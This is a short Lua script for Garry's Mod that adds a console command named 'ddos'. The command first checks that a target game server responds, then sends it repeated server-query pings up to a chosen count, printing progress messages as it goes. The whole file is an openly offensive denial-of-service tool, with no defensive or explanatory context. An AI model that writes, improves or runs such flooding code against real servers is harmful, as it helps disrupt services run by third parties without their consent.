MsgN( "Booted Successfully" )

local CachedCount = 0
local Response = false

local function QueryIP( IP, Count )
    Count = tonumber( Count )
    
    if Count <= CachedCount then 
        Response = false 
        CachedCount = 0
        return MsgN( string.format( '\nFinished sending %s packets to %s', Count, IP ) ) 
    end

    CachedCount = CachedCount + 1

    serverlist.PingServer( IP, function( ping, name, desc, map, players, maxplayers, botplayers, pass, lastplayed, address, gamemode, workshopid, isanon, version, localization, gmcategory )
        if not ping then 
            Response = false 
            CachedCount = 0
            return MsgN( 'Stopped early to prevent packet overflow!' )
        end 

        MsgN( string.format( 'Queried %s [%s, %s]', address, ping, CachedCount ) )
        
        QueryIP( IP, Count )
    
        return false 
    end )
end

concommand.Add( 'ddos', function( _, __, arg, argString )
    local IP = arg[ 1 ] .. arg[ 2 ] .. arg[ 3 ]
    local Count = arg[ 4 ]

    if not IP then return MsgN( "Invalid IP" ) end
    if not Count then return MsgN( "Invalid Count" ) end

    if CachedCount != 0 then return end 

    serverlist.PingServer( IP, function( ping, name, desc, map, players, maxplayers, botplayers, pass, lastplayed, address, gamemode, workshopid, isanon, version, localization, gmcategory )
        if ping != nil then 
            MsgN( string.format( '[ %s ] %s (%s, %s) %s players', ping, name, map, gamemode, players ) )

            Response = true 
        else
            MsgN( 'Failed to Query "' .. IP .. '"' )
        end
    end )

    timer.Simple( .5, function( )
        if Response then 
            MsgN( '\nConnection Established' )

            MsgN( string.format( '\nSending %s packets\n', Count ) )

            QueryIP( IP, Count )
        end
    end )
end )
